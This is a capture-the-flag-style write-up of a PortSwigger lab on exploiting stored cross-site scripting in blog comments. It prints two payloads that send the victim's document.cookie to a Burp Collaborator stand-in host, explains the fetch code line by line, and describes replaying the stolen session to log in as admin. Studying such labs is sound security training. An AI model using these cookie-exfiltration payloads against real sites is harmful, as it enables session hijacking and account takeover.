You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.

### In practice, this approach has some significant limitations:
- The victim might not be logged in.
- Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
- Sessions might be locked to additional factors like the user's IP address.
- The session might time out before you're able to hijack it.

## Steps to solve lab
### Title - Exploiting cross-site scripting to steal cookies
**Desc** - This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

**Our end goal** - To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

1. Analyze the page and as per the lab description there is a vulnerability in the blog comments function.
![[XSS93.png]]

![[XSS94.png]]
As you can see above, our tag is not sanitized it means we can execute javascript.

2. Now, copy the below payload and paste it into the "comment" box.

**Payload** - 
```jsx
<img src=x onerror=this.src='https://BURP-COLLABORATOR-SUBDOMAIN/?'+document.cookie;>
```

Alerternatively you can also use the below payload - 
```js
<script> 
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { 
method: 'POST', 
mode: 'no-cors', 
body:document.cookie 
}); 
</script>
```

**Explaination to above code** - 

1. `fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {...});`: 
	- This line initiates an HTTP request to the URL `'https://BURP-COLLABORATOR-SUBDOMAIN'`. Replace `'https://BURP-COLLABORATOR-SUBDOMAIN'` with the actual URL you want to target. This URL is where the data will be sent.

2. `method: 'POST'`:
	- This specifies the HTTP request method as POST. In the context of web requests, a POST request is often used to send data to a server.

3. `mode: 'no-cors'`:
	- This sets the request mode to 'no-cors'. The 'no-cors' mode is used for requests where you do not need to access the response from the server, and it's mainly used to avoid certain security restrictions, such as the same-origin policy.
	- However, it also means that you won't be able to access the response from the server, including any error messages.

4. `body: document.cookie`:
	- This sets the body of the POST request to the value of `document.cookie`.
	- In JavaScript, `document.cookie` represents the cookies associated with the current webpage. By including `document.cookie` in the request body, you are essentially sending the user's cookies to the specified URL.



![[XSS95.png]]

![[XSS96.png]]
There is a mistake above regarding img tag but you should close the img tag.

![[XSS97.png]]
As you can see above, we got the session of the victim. It means, it is that user that viewed our comment on the blog and we successfully steal the cookie of that user.

**In burp collaborator** -
![[XSS98.png]]

3. Now, intercept the `/myaccount` request and replace your session with the session that get in the burp collaborator.
![[XSS99.png]]
Forward the request and you see that now you logged in as admin 
![[XSS100.png]]

For better understanding visit --> [[Exploiting Cross-site Scripting to Steal Cookies Without Collaborator.mp4]]